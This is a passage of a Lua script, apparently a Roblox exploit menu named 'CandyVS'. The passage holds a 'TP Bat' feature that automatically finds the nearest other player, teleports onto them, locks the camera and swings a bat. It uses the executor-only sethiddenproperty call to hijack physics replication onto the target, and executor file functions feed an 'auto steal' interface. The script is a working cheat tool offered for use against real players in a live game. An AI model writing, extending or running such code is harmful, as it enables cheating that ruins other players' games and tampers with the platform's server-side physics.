	if flatFallback and flatFallback.Magnitude >= 0.01 then
	return CFrame.lookAt(position, position + flatFallback.Unit)
	end
	if keepCF then
	local _, yaw = keepCF:ToEulerAnglesYXZ()
	return CFrame.new(position) * CFrame.Angles(0, yaw, 0)
	end
	return CFrame.new(position)
	end

	local function isInsideAllowedArea(position)
	return position ~= nil
	end

	local function clearLastTargetMarker() end
	local function targetAlive(player, myRoot)
	if not player or player.Parent ~= Players or not player.Character then return false end
	local root = player.Character:FindFirstChild("HumanoidRootPart")
	local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
	if not root or not humanoid or humanoid.Health <= 0 or not finiteVector(root.Position) then
	return false
	end
	local sample = tpBatState.samples[player]
	return _G.__CandyVSTPBatIsInsideMap(root.Position)
	or (sample ~= nil and sample.safeCFrame ~= nil)
	end

	local function getRememberedTargetCFrame(player, myRoot)
	local sample = player and tpBatState.samples[player]
	local saved = sample and sample.safeCFrame
	if saved and isInsideAllowedArea(saved.Position)
	and (not myRoot or isInsideAllowedArea(saved.Position)) then
	return saved
	end
	return nil
	end

	local function closestTarget(myRoot)
	local tracked = _G.__CandyVSTPBatTrackTarget(tpBatState.target)
	if targetAlive(tracked, myRoot) then
	tpBatState.target = tracked
	return tracked
	end
	if targetAlive(tpBatState.target, myRoot) then return tpBatState.target end

	local closest = nil
	local closestDistance = math.huge
	for _, player in ipairs(Players:GetPlayers()) do
	if player ~= Player and targetAlive(player, myRoot) then
	local root = player.Character:FindFirstChild("HumanoidRootPart")
	if root then
	local distance = (root.Position - myRoot.Position).Magnitude
	if distance < closestDistance then
	closest = player
	closestDistance = distance
	end
	end
	end
	end
	if closest then
	tpBatState.target = closest
	_G.__CandyVSTPBatTrackTarget(closest)
	end
	return closest
	end

	local function getTPBatDistance()
	local distance = tonumber(_G.__tpBatV2Distance)
	if not distance or distance ~= distance then return 8 end
	return math.clamp(distance, 0, 100)
	end

	local function swingBat()
	local now = tick()
	if tpBatState.swingLocked or now < tpBatState.nextSwingAt then return end
	tpBatState.swingLocked = true
	tpBatState.nextSwingAt = now + TP_BAT_COOLDOWN

	pcall(function()
	local character = Player.Character
	if not character then return end
	local tool = findBat(true)
	if not tool then return end
	if tool.Parent ~= character then
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if humanoid then humanoid:EquipTool(tool) end
	end
	tool:Activate()
	local remote = tool:FindFirstChildWhichIsA("RemoteEvent", true)
	if remote then pcall(function() remote:FireServer() end) end
	end)

	task.delay(TP_BAT_COOLDOWN, function()
	tpBatState.swingLocked = false
	end)
	end

	local function resetPhysicsRoot(root)
	if sethiddenproperty then
	pcall(function() sethiddenproperty(root, "PhysicsRepRootPart", root) end)
	end
	end

	local function desktopHeartbeatStep()
	if not tpBatState.enabled then return end
	local character, root, humanoid = getRig()
	if not character or not root or not humanoid or humanoid.Health <= 0 then return end
	if tpBatState.previousAutoRotate == nil then tpBatState.previousAutoRotate = humanoid.AutoRotate end
	humanoid.AutoRotate = false

	findBat(true)
	local target = closestTarget(root)
	if target then
	local targetRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
	local rememberedCFrame = getRememberedTargetCFrame(target, root)
	if not targetRoot or not finiteVector(targetRoot.Position) then return end
	if not _G.__CandyVSTPBatIsInsideMap(targetRoot.Position) then
	_G.__CandyVSTPBatForceMarker(target, rememberedCFrame)
	if followPreservedMarker(root) then swingBat() end
	return
	end
	local targetCFrame = targetRoot.CFrame
	local sample = tpBatState.samples[target] or {}
	tpBatState.samples[target] = sample
	sample.safeCFrame = targetRoot.CFrame
	sample.safePosition = targetRoot.Position
	local targetVelocity = targetRoot.AssemblyLinearVelocity
	local targetLead = Vector3.new(targetVelocity.X, 0, targetVelocity.Z) * 0.06
	local targetPos = targetCFrame.Position + Vector3.new(0, 0.9, 0) + targetLead
	local targetLook = targetCFrame.LookVector
		if (root.Position - targetPos).Magnitude > getTPBatDistance() then
		safeTeleport(root, facingCFrame(targetPos, targetCFrame.Position, targetLook, root.CFrame))
		else
		safeTeleport(root, facingCFrame(root.Position, targetCFrame.Position, targetLook, root.CFrame))
		end
	if sethiddenproperty then
	pcall(function()
	if targetRoot then sethiddenproperty(root, "PhysicsRepRootPart", targetRoot) end
	end)
	end
	local cam = workspace.CurrentCamera
	if cam then
	pcall(function() cam.CFrame = CFrame.new(cam.CFrame.Position, targetCFrame.Position) end)
	end
	swingBat()
	end
	end

	local function zurichV2HeartbeatStep()
	if not tpBatState.enabled then return end
	local character, root, humanoid = getRig()
	if not character or not root or not humanoid or humanoid.Health <= 0 then return end
	if tpBatState.previousAutoRotate == nil then tpBatState.previousAutoRotate = humanoid.AutoRotate end
	humanoid.AutoRotate = false

	local target = closestTarget(root)
	if not target then return end
	local targetRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
	local rememberedCFrame = getRememberedTargetCFrame(target, root)
	local targetCFrame = targetRoot and targetRoot.CFrame or rememberedCFrame
	local usingRememberedPosition = not targetRoot
	local markerTrigger = false

	if targetRoot then
	local sample = tpBatState.samples[target] or {}
	tpBatState.samples[target] = sample
	markerTrigger = targetRoot.Position.Y < -9
	or not _G.__CandyVSTPBatIsInsideMap(targetRoot.Position)
	or not finiteVector(targetRoot.Position)
	local validSnapshot = finiteVector(targetRoot.Position)
	and _G.__CandyVSTPBatIsInsideMap(targetRoot.Position)
	if validSnapshot then
	sample.safeCFrame = targetRoot.CFrame
	sample.safePosition = targetRoot.Position
	else
	targetCFrame = rememberedCFrame
	usingRememberedPosition = true
	end
	end

	if not targetCFrame then return end
	if usingRememberedPosition and markerTrigger then
	_G.__CandyVSTPBatForceMarker(target, targetCFrame)
	if followPreservedMarker(root) then
	swingBat()
	return
	end
	end

	local targetVelocity = targetRoot and targetRoot.AssemblyLinearVelocity or Vector3.zero
	local targetLead = Vector3.new(targetVelocity.X, 0, targetVelocity.Z) * 0.06
	local targetPosition = targetCFrame.Position + targetLead
	if not usingRememberedPosition then
	targetPosition = targetPosition + Vector3.new(0, 0.9, 0)
	end
	local engagement
	if (root.Position - targetPosition).Magnitude > getTPBatDistance() then
	engagement = facingCFrame(targetPosition, targetCFrame.Position, targetCFrame.LookVector, root.CFrame)
	else
	engagement = facingCFrame(root.Position, targetCFrame.Position, targetCFrame.LookVector, root.CFrame)
	end
	safeTeleport(root, engagement)

	if sethiddenproperty then
	pcall(function()
	if targetRoot then sethiddenproperty(root, "PhysicsRepRootPart", targetRoot) end
	end)
	end
	local camera = workspace.CurrentCamera
	if camera then
	pcall(function() camera.CFrame = CFrame.new(camera.CFrame.Position, targetCFrame.Position) end)
	end
	swingBat()
	end

	local function inspectMobileTarget(player, targetRoot, myRoot)
	if not targetAlive(player, myRoot) or not targetRoot then return true, nil end

	local now = tick()
	local position = targetRoot.Position
	local velocity = targetRoot.AssemblyLinearVelocity
	local sample = tpBatState.samples[player] or {}
	tpBatState.samples[player] = sample

	local destroyHeight = workspace.FallenPartsDestroyHeight or -500
	local voidFloor = math.max(destroyHeight + 90, -50)
	local deltaTime = sample.time and math.max(now - sample.time, 1 / 240) or math.huge
	local delta = sample.position and (position - sample.position) or Vector3.zero
	local impossibleStep = sample.position ~= nil and deltaTime < 0.4 and (delta.Magnitude > 90 or math.abs(delta.Y) > 38)
	local badVelocity = not finiteVector(velocity) or velocity.Magnitude > 100 or math.abs(velocity.Y) > 150
	local badPosition = not finiteVector(position) or position.Y <= voidFloor or position.Y > 650 or (myRoot and (position - myRoot.Position).Magnitude > 4000)

	if badPosition or badVelocity or impossibleStep then
	sample.suspiciousUntil = now + 1.35
	elseif now >= (sample.suspiciousUntil or 0) then
	sample.safePosition = position
	sample.safeCFrame = targetRoot.CFrame
	end
	sample.position = position
	sample.time = now
	return now < (sample.suspiciousUntil or 0), sample
	end

	local function guardMobileAgainstVoid(root, humanoid, targetRoot)
	local now = tick()
	local position = root.Position
	local velocity = root.AssemblyLinearVelocity
	local destroyHeight = workspace.FallenPartsDestroyHeight or -500
	local voidFloor = math.max(destroyHeight + 80, -55)
	local deltaTime = now - (tpBatState.lastSampleTime or now)
	local suddenDrop = tpBatState.lastPosition and deltaTime <= 0.35 and position.Y < tpBatState.lastPosition.Y - 40
	local suddenRise = tpBatState.lastPosition and deltaTime <= 0.35 and position.Y > tpBatState.lastPosition.Y + 25
	local forcedLaunch = math.abs(velocity.Y) > 90 or velocity.Magnitude > 450
	local invalidHeight = position.Y <= voidFloor or position.Y > 400
	local recovering = now < tpBatState.recoverUntil

	if invalidHeight or suddenDrop or suddenRise or forcedLaunch then
	resetPhysicsRoot(root)
	local recovery = tpBatState.lastSafeCFrame
	if targetRoot and targetRoot.Parent and targetRoot.Position.Y > voidFloor + 10 and targetRoot.Position.Y < 350 then
	local positionOnTarget = targetRoot.Position + Vector3.new(0, 0.9, 0)
	recovery = facingCFrame(positionOnTarget, targetRoot.Position, targetRoot.CFrame.LookVector)
	end
	pcall(function()
	root.AssemblyLinearVelocity = Vector3.zero
	root.AssemblyAngularVelocity = Vector3.zero
	humanoid.PlatformStand = false
	humanoid.Sit = false
	humanoid.AutoRotate = true
	humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
	if recovery then safeTeleport(root, recovery) end
	end)
	tpBatState.recoverUntil = now + 0.55
	tpBatState.physicsPauseUntil = now + 0.20
	recovering = true
	elseif not recovering and position.Y > voidFloor + 15 and math.abs(velocity.Y) < 85 and position.Y < 250 then
	tpBatState.lastSafeCFrame = root.CFrame
	end

	if recovering then
	pcall(function()
	root.AssemblyLinearVelocity = Vector3.zero
	root.AssemblyAngularVelocity = Vector3.zero
	if targetRoot and targetRoot.Parent and targetRoot.Position.Y > voidFloor + 10 and targetRoot.Position.Y < 350 then
	safeTeleport(root, facingCFrame(targetRoot.Position + Vector3.new(0, 0.9, 0), targetRoot.Position, targetRoot.CFrame.LookVector))
	elseif tpBatState.lastSafeCFrame then
	safeTeleport(root, facingCFrame(root.Position, root.Position, nil, tpBatState.lastSafeCFrame))
	end
	end)
	resetPhysicsRoot(root)
	end

	tpBatState.lastPosition = root.Position
	tpBatState.lastSampleTime = now
	return recovering
	end

	local function mobileHeartbeatStep()
	if not tpBatState.enabled then return end
	local character, root, humanoid = getRig()
	if not character or not root or not humanoid or humanoid.Health <= 0 then return end

	if followPreservedMarker(root) then
	swingBat()
	return
	end
	if tpBatState.previousAutoRotate == nil then tpBatState.previousAutoRotate = humanoid.AutoRotate end
	humanoid.AutoRotate = false

	findBat(true)
	local target = closestTarget(root)
	if target then
	local targetRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
	local rememberedCFrame = getRememberedTargetCFrame(target, root)
	local targetLeftMap = targetRoot and not _G.__CandyVSTPBatIsInsideMap(targetRoot.Position)
	if targetLeftMap then targetRoot = nil end
	if targetRoot or rememberedCFrame then
	local suspicious, sample = false, tpBatState.samples[target]
	if targetRoot then suspicious, sample = inspectMobileTarget(target, targetRoot, root) end
	if guardMobileAgainstVoid(root, humanoid, suspicious and nil or targetRoot) then
	swingBat()
	return
	end

	local targetPosition
	if suspicious then
	targetPosition = sample and sample.safePosition
	if not targetPosition and tpBatState.lastSafeCFrame then targetPosition = tpBatState.lastSafeCFrame.Position end
	if not targetPosition then targetPosition = root.Position end
	elseif targetRoot then
	local velocity = targetRoot.AssemblyLinearVelocity
	local prediction = Vector3.new(velocity.X, 0, velocity.Z) * 0.05
	targetPosition = targetRoot.Position + Vector3.new(0, 0.9, 0) + prediction
	else
	targetPosition = rememberedCFrame.Position
	end

	if targetRoot and not suspicious and targetPosition.Y < -20 then
	targetPosition = Vector3.new(targetPosition.X, root.Position.Y, targetPosition.Z)
	end

	local targetCFrame = targetRoot and targetRoot.CFrame or rememberedCFrame
	local engagement = facingCFrame(targetPosition, targetCFrame.Position, targetCFrame.LookVector, tpBatState.lastSafeCFrame)
	safeTeleport(root, engagement)
	pcall(function()
	if targetRoot then
	local targetVelocity = targetRoot.AssemblyLinearVelocity
	root.AssemblyLinearVelocity = Vector3.new(targetVelocity.X, 0, targetVelocity.Z)
	end
	root.AssemblyAngularVelocity = Vector3.zero
	end)
	tpBatState.lastSafeCFrame = engagement

	if sethiddenproperty and tick() >= tpBatState.physicsPauseUntil then
	pcall(function()
	if targetRoot then sethiddenproperty(root, "PhysicsRepRootPart", targetRoot) end
	end)
	end

	local camera = workspace.CurrentCamera
	if camera then pcall(function() camera.CFrame = CFrame.new(camera.CFrame.Position, targetCFrame.Position) end) end
	swingBat()
	end
	end
	end

	local function selectedHeartbeatStep()
	if _G.__batVersion == 2 then
	return zurichV2HeartbeatStep()
	end
	return desktopHeartbeatStep()
	end

	local function stopTPBat()
	local wasEnabled = tpBatState.enabled
	local stopGeneration = tpBatState.returnGeneration
	clearMarkerBodyLock()
	tpBatState.enabled = false
	if tpBatState.heartbeat then
	tpBatState.heartbeat:Disconnect()
	tpBatState.heartbeat = nil
	end
	tpBatState.target = nil
	tpBatState.samples = {}
	tpBatState.swingLocked = false

	local _, root, humanoid = getRig()
	if root then
	local velocity = root.AssemblyLinearVelocity
	local horizontal = Vector3.new(velocity.X, 0, velocity.Z)
	if horizontal.Magnitude > 120 then horizontal = horizontal.Unit * 120 end
	root.AssemblyLinearVelocity = Vector3.new(horizontal.X, math.clamp(velocity.Y, -50, 50), horizontal.Z)
	root.AssemblyAngularVelocity = Vector3.zero
	resetPhysicsRoot(root)
	end
	if humanoid then
	humanoid.AutoRotate = tpBatState.previousAutoRotate == nil and true or tpBatState.previousAutoRotate
	pcall(function()
	humanoid.PlatformStand = false
	humanoid.Sit = false
	local state = humanoid:GetState()
	if state == Enum.HumanoidStateType.Physics
	or state == Enum.HumanoidStateType.Ragdoll
	or state == Enum.HumanoidStateType.FallingDown then
	humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
	humanoid:ChangeState(Enum.HumanoidStateType.Running)
	end
	local camera = workspace.CurrentCamera
	if camera then camera.CameraSubject = humanoid end
	end)
	end
	tpBatState.previousAutoRotate = nil
	if wasEnabled and root then
	task.spawn(function()
	for _ = 1, 12 do
	RunService.Heartbeat:Wait()
	if tpBatState.enabled or tpBatState.returnGeneration ~= stopGeneration then return end
	if _G.__CANDYVS_STATE ~= candyvsRuntimeState then return end
	local _, currentRoot, currentHumanoid = getRig()
	if currentRoot ~= root or not currentHumanoid or currentHumanoid.Health <= 0 then return end
	local currentVelocity = currentRoot.AssemblyLinearVelocity
	local currentHorizontal = Vector3.new(currentVelocity.X, 0, currentVelocity.Z)
	if currentHorizontal.Magnitude > 120 then currentHorizontal = currentHorizontal.Unit * 120 end
	currentRoot.AssemblyLinearVelocity = Vector3.new(currentHorizontal.X, math.clamp(currentVelocity.Y, -50, 50), currentHorizontal.Z)
	currentRoot.AssemblyAngularVelocity = Vector3.zero
	resetPhysicsRoot(currentRoot)
	end
	end)
	end
	if wasEnabled then
	task.delay(0.4, function()
	if tpBatState.enabled or tpBatState.returnGeneration ~= stopGeneration then return end
	if _G.__CANDYVS_STATE ~= candyvsRuntimeState then return end
	pcall(function() if _G.__CandyVSAntiDieSet then _G.__CandyVSAntiDieSet(false) end end)
	end)
	else
	pcall(function() if _G.__CandyVSAntiDieSet then _G.__CandyVSAntiDieSet(false) end end)
	end
	end

	local function startTPBat()
	if tpBatState.enabled then return end
	tpBatState.returnGeneration = (tpBatState.returnGeneration or 0) + 1
	if toggleStates["Autoplay"] and _G.__stopAutoplay then _G.__stopAutoplay() end
	tpBatState.enabled = true
	pcall(function() if _G.__CandyVSAntiDieSet then _G.__CandyVSAntiDieSet(true) end end)
	pcall(function() if _G.__CandyVSTPBatClearMarkerTracking then _G.__CandyVSTPBatClearMarkerTracking() end end)
	tpBatState.lastTargetMarker = nil
	tpBatState.markerLocked = false
	tpBatState.markerTarget = nil
	tpBatState.target = nil
	tpBatState.samples = {}
	tpBatState.swingLocked = false
	tpBatState.nextSwingAt = 0
	tpBatState.lastPosition = nil
	tpBatState.lastSampleTime = tick()
		tpBatState.recoverUntil = 0
		tpBatState.physicsPauseUntil = 0
		tpBatState.startingUntil = tick() + 0.35
	local _, root, humanoid = getRig()
	if root then
	resetPhysicsRoot(root)
	if root.Position.Y > -30 then tpBatState.lastSafeCFrame = root.CFrame end
	end
	if humanoid then tpBatState.previousAutoRotate = humanoid.AutoRotate end
		if tpBatState.heartbeat then tpBatState.heartbeat:Disconnect() end
		tpBatState.heartbeat = RunService.Heartbeat:Connect(selectedHeartbeatStep)
		task.spawn(function() pcall(selectedHeartbeatStep) end)
	end

	FeaturePostToggle["TP Bat"] = function(active)
	if active then
	deactivateOtherAimbots("TP Bat")
	_G.__deactivateBatExclusive("TP Bat")
	startTPBat()
	else
	stopTPBat()
	end
	end
	_G.__CandyVSTrackStopper(function()
	pcall(stopTPBat)
	pcall(clearLastTargetMarker)
	end)

	_G.CandyVSAutoBat = {
	GetVersion = function() return _G.__batVersion or 1 end,
	SetVersion = function(v)
	_G.__batVersion = tonumber(v) == 2 and 2 or 1
	tpBatState.samples = {}
	tpBatState.lastPosition = nil
	tpBatState.lastSampleTime = tick()
	tpBatState.recoverUntil = 0
	tpBatState.physicsPauseUntil = 0
	if _G.__batVersionPill then
	_G.__batVersionPill.Text = "V" .. tostring(_G.__batVersion)
	end
	if _G.__CandyVSUpdateBatVersionButton then _G.__CandyVSUpdateBatVersionButton() end
	if _G.__CandyVSRefreshVisibleTPBatConfig then _G.__CandyVSRefreshVisibleTPBatConfig() end
	saveConfig()
	if tpBatState.enabled then
	local _, root = getRig()
	if root then resetPhysicsRoot(root) end
	selectedHeartbeatStep()
	end
	return _G.__batVersion
	end,
	GetV2Distance = getTPBatDistance,
	SetV2Distance = function(value)
	local normalized = tostring(value):gsub(",", ".")
	local distance = tonumber(normalized)
	local valid = distance and distance == distance and math.abs(distance) < math.huge
	if valid then
	_G.__tpBatV2Distance = math.floor(math.clamp(distance, 0, 100) * 100 + 0.5) / 100
	end
	if _G.__CandyVSUpdateBatVersionButton then _G.__CandyVSUpdateBatVersionButton() end
	if _G.__CandyVSRefreshVisibleTPBatConfig then _G.__CandyVSRefreshVisibleTPBatConfig() end
	if valid then
	saveConfig()
	if tpBatState.enabled then selectedHeartbeatStep() end
	end
	return getTPBatDistance()
	end,
	SetEnabled = function(active)
	active = active == true
	toggleStates["TP Bat"] = active
	if toggleStateSetters["TP Bat"] then pcall(toggleStateSetters["TP Bat"], active) end
	FeaturePostToggle["TP Bat"](active)
	if toggleVisualUpdaters["TP Bat"] then pcall(toggleVisualUpdaters["TP Bat"]) end
	saveConfig()
	return tpBatState.enabled
	end,
	Toggle = function()
	return _G.CandyVSAutoBat.SetEnabled(not (toggleStates["TP Bat"] == true))
	end,
	Stop = function() pcall(stopTPBat) end,
	}
	end
end)()

	local farmingSection = combatSection
	local dropRow = makeToggle(farmingSection, "Drop", "Drop")
	pcall(function() styleSmallToggle(dropRow) end)
	local autoGrabRow = makeToggle(farmingSection, "CandyVS Auto Steal", "auto steal")
	pcall(function() styleSmallToggle(autoGrabRow) end)

	do
	local grabBarGui = Instance.new("Frame", ScreenGui)
	grabBarGui.Name = "CandyVSAutoGrabBar"
	grabBarGui.AnchorPoint = Vector2.new(0, 0)
	local defaultExpandedW = isMobile and 300 or 380
	local defaultCollapsedW = isMobile and 260 or 320
	local partialCollapsedW = math.floor((defaultExpandedW + defaultCollapsedW) / 2)
	local savedSize = _G["_CandyVS_UI_AutoGrabBarSize"]
	local grabBarExpanded = _G["_CandyVS_UI_AutoGrabExpanded"] ~= nil and _G["_CandyVS_UI_AutoGrabExpanded"] or true
	local savedWidth = tonumber(savedSize)
	if savedWidth and savedWidth < defaultCollapsedW then savedWidth = nil end
	local currentW = savedWidth and math.clamp(savedWidth, defaultCollapsedW, defaultExpandedW) or defaultExpandedW
	if savedSize and tonumber(savedSize) and tonumber(savedSize) <= defaultCollapsedW then
	grabBarExpanded = false
	end
	_G["_CandyVS_UI_AutoGrabExpanded"] = grabBarExpanded
	local grabBarSize = UDim2.new(0, currentW, 0, isMobile and 40 or 44)
	grabBarGui.Size = grabBarSize

	local savedBarPos = _G["_CandyVS_UI_AutoGrabBarPos"]
	if savedBarPos and savedBarPos.x and savedBarPos.y then
	grabBarGui.Position = UDim2.fromOffset(savedBarPos.x, savedBarPos.y)
	else
	grabBarGui.Position = UDim2.new(0.5, -currentW / 2, 0.80, 0)
	end
	grabBarGui.BackgroundColor3 = Color3.fromRGB(12, 10, 18)
	grabBarGui.BackgroundTransparency = 0.12
	grabBarGui.BorderSizePixel = 0
	grabBarGui.ZIndex = 500
	grabBarGui.Active = true
	grabBarGui.Draggable = false
	grabBarGui.Visible = false
	local grabBarCorner = Instance.new("UICorner", grabBarGui)
	grabBarCorner.CornerRadius = UDim.new(1, 0)
	local candyvsBarImage = Instance.new("ImageLabel", grabBarGui)
	candyvsBarImage.Name = "CandyVSAutoStealBackground"
	candyvsBarImage.Size = UDim2.new(1, 0, 1, 0)
	candyvsBarImage.BackgroundTransparency = 1
	candyvsBarImage.Image = "rbxassetid://114056083769059"
	pcall(function()
		if type(getcustomasset) == "function" and type(isfile) == "function" and isfile("CandyVS.png") then
			candyvsBarImage.Image = getcustomasset("CandyVS.png")
		end
	end)
	candyvsBarImage.ImageTransparency = 0.72
	candyvsBarImage.ScaleType = Enum.ScaleType.Crop
	candyvsBarImage.ZIndex = 499
	local candyvsBarCorner = Instance.new("UICorner", candyvsBarImage)
	candyvsBarCorner.CornerRadius = UDim.new(1, 0)
	local barStrokeInst = Instance.new("UIStroke", grabBarGui)
	barStrokeInst.Color = Color3.fromRGB(255, 160, 40)
	barStrokeInst.Thickness = 1.2
	barStrokeInst.Transparency = 0.45
	barStrokeInst.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	local barSoftGlow = Instance.new("UIStroke", grabBarGui)
	barSoftGlow.Name = "StealBarGlow"
	barSoftGlow.Color = Color3.fromRGB(255, 100, 180)
	barSoftGlow.Thickness = 3
	barSoftGlow.Transparency = 0.85
	barSoftGlow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	local outerReliefGradient = Instance.new("UIGradient", grabBarGui)
	outerReliefGradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 14, 32)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(18, 8, 16)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 4, 2)),
	})
	outerReliefGradient.Rotation = 90

	local topRow = Instance.new("Frame", grabBarGui)
	topRow.Size = UDim2.new(0, isMobile and 100 or 120, 1, -6)
	topRow.Position = UDim2.new(1, isMobile and -108 or -128, 0, 2)
	topRow.BackgroundTransparency = 1
	topRow.Visible = true
	topRow.ZIndex = 504

	local statsDivider = Instance.new("Frame", topRow)
	statsDivider.Name = "Divider"
	statsDivider.Size = UDim2.new(0, 1, 1, -10)
	statsDivider.Position = UDim2.new(0, 0, 0, 5)
	statsDivider.BorderSizePixel = 0
	statsDivider.BackgroundColor3 = Color3.fromRGB(155, 155, 155)
	statsDivider.BackgroundTransparency = 0.25
	statsDivider.ZIndex = 505

	StatsRightFps = Instance.new("TextLabel", topRow)
	StatsRightFps.Size = UDim2.new(1, -10, 0, 14)
	StatsRightFps.Position = UDim2.new(0, isMobile and 7 or 9, 0, isMobile and 6 or 9)
	StatsRightFps.BackgroundTransparency = 1
	StatsRightFps.TextColor3 = Color3.fromRGB(180, 230, 255)
	StatsRightFps.TextStrokeColor3 = Color3.fromRGB(20, 10, 30)
	StatsRightFps.TextStrokeTransparency = 0.5
	StatsRightFps.Font = Enum.Font.FredokaOne
	StatsRightFps.TextSize = isMobile and 9 or 10
	StatsRightFps.TextXAlignment = Enum.TextXAlignment.Left
	StatsRightFps.ZIndex = 506
	StatsRightFps.Visible = true

	StatsRightPing = Instance.new("TextLabel", topRow)
	StatsRightPing.Size = UDim2.new(1, -10, 0, 14)
	StatsRightPing.Position = UDim2.new(0, isMobile and 7 or 9, 0, isMobile and 23 or 27)
	StatsRightPing.BackgroundTransparency = 1
	StatsRightPing.TextColor3 = Color3.fromRGB(180, 230, 255)
	StatsRightPing.TextStrokeColor3 = Color3.fromRGB(20, 10, 30)
	StatsRightPing.TextStrokeTransparency = 0.5
	StatsRightPing.Font = Enum.Font.FredokaOne
	StatsRightPing.TextSize = isMobile and 9 or 10
	StatsRightPing.TextXAlignment = Enum.TextXAlignment.Left
	StatsRightPing.ZIndex = 506
	StatsRightPing.Visible = true

	local percentLabel = Instance.new("TextLabel", topRow)
	percentLabel.Size = UDim2.new(0, 54, 1, 0)
	percentLabel.Position = UDim2.new(1, -84, 0, 0)
	percentLabel.BackgroundTransparency = 1
	percentLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
	percentLabel.Font = Enum.Font.FredokaOne
	percentLabel.TextSize = 11
	percentLabel.TextXAlignment = Enum.TextXAlignment.Right
	percentLabel.ZIndex = 502
	percentLabel.Visible = false

	local resizeBtn = Instance.new("TextButton", grabBarGui)
	resizeBtn.Size = UDim2.new(0, 16, 0, 16)
	resizeBtn.Position = UDim2.new(1, -22, 0, 3)
	resizeBtn.AnchorPoint = Vector2.new(0, 0)
	resizeBtn.BackgroundTransparency = 0.2
	resizeBtn.BackgroundColor3 = Color3.fromRGB(110, 110, 110)
	resizeBtn.TextColor3 = Color3.fromRGB(235, 240, 245)
	resizeBtn.Font = Enum.Font.FredokaOne
	resizeBtn.TextSize = 10
	resizeBtn.Text = grabBarExpanded and "-" or "+"
	resizeBtn.Visible = false
	Instance.new("UICorner", resizeBtn).CornerRadius = UDim.new(1,0)
	resizeBtn.ZIndex = 510

	local barBg
	local function applyBarWidth(newW)
	if not newW or tonumber(newW) == nil then
	return
	end
	local ok, _ = pcall(function()
	if grabBarGui and grabBarGui.Size and grabBarGui.Size.Y then
	local yOffset = grabBarGui.Size.Y.Offset or (isMobile and 44 or 56)
	grabBarGui.Size = UDim2.new(0, tonumber(newW), 0, yOffset)
	end
	if barBg and barBg.Size then
	barBg.Size = UDim2.new(1, -24, 0, 4)
	end
	end)
	if ok then
	_G["_CandyVS_UI_AutoGrabBarSize"] = tonumber(newW)
	pcall(saveConfig)
	end
	end
	if not grabBarExpanded then
	applyBarWidth(partialCollapsedW)
	end

	resizeBtn.MouseButton1Click:Connect(function()
	grabBarExpanded = not grabBarExpanded
	_G["_CandyVS_UI_AutoGrabExpanded"] = grabBarExpanded
	if grabBarExpanded then
	applyBarWidth(defaultExpandedW)
	resizeBtn.Text = "-"
	else
	applyBarWidth(partialCollapsedW)
	resizeBtn.Text = "+"
	end
	end)

	barBg = Instance.new("Frame", grabBarGui)
	barBg.Size = UDim2.new(1, -24, 0, 4)
	barBg.Position = UDim2.new(0, 12, 1, -10)
	barBg.BackgroundColor3 = Color3.fromRGB(40, 30, 50)
	barBg.BackgroundTransparency = 0.25
	barBg.BorderSizePixel = 0
	barBg.ZIndex = 501
	Instance.new("UICorner", barBg).CornerRadius = UDim.new(1, 0)
	local trackStroke = Instance.new("UIStroke", barBg)
	trackStroke.Color = Color3.fromRGB(255, 140, 0)
	trackStroke.Thickness = 0
	trackStroke.Transparency = 1

	local barFill = Instance.new("Frame", barBg)
	barFill.Size = UDim2.new(0, 0, 1, 0)
	barFill.Position = UDim2.new(0, 0, 0, 0)
	barFill.BorderSizePixel = 0
	barFill.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
	barFill.ClipsDescendants = true
	barFill.ZIndex = 502
	Instance.new("UICorner", barFill).CornerRadius = UDim.new(1, 0)
	local fillGradient = Instance.new("UIGradient", barFill)
	fillGradient.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 200, 230)),
		ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 120, 190)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 50, 140)),
	})
	fillGradient.Rotation = 0
	local barThemeColor = Color3.fromRGB(255, 140, 0)
	local barLabel, barPercentLabel
	local function applyAutoStealBarTheme(themeName)
	local backgroundFile = themeName == "GUI 2" and "CandyVS_Background_2_v2.png" or "CandyVS.png"
	local backgroundFallback = themeName == "GUI 2" and "rbxassetid://114056083769059" or "rbxassetid://114056083769059"
	local backgroundAsset = backgroundFallback
	pcall(function()
		if themeName == "GUI 2" and type(writefile) == "function" and type(isfile) == "function" and not isfile(backgroundFile) then
			if type(bytes) == "string" and #bytes > 1000 then writefile(backgroundFile, bytes) end
		end
		if type(getcustomasset) == "function" and type(isfile) == "function" and isfile(backgroundFile) then
			backgroundAsset = getcustomasset(backgroundFile)
		end
	end)
	candyvsBarImage.Image = backgroundAsset
	if themeName == "GUI 2" then
	barThemeColor = Color3.fromRGB(255, 140, 40)
	fillGradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 210, 150)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 150, 60)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 90, 20)),
	})
	else
	barThemeColor = Color3.fromRGB(255, 140, 0)
	fillGradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 200, 230)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 120, 190)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 50, 140)),
	})
	end
	barFill.BackgroundColor3 = barThemeColor
	barBg.BackgroundColor3 = themeName == "GUI 2" and Color3.fromRGB(28, 14, 8) or Color3.fromRGB(20, 10, 18)
	barStrokeInst.Color = themeName == "GUI 2" and Color3.fromRGB(255, 150, 60) or Color3.fromRGB(255, 130, 200)
	outerReliefGradient.Color = themeName == "GUI 2" and ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 22, 10)),
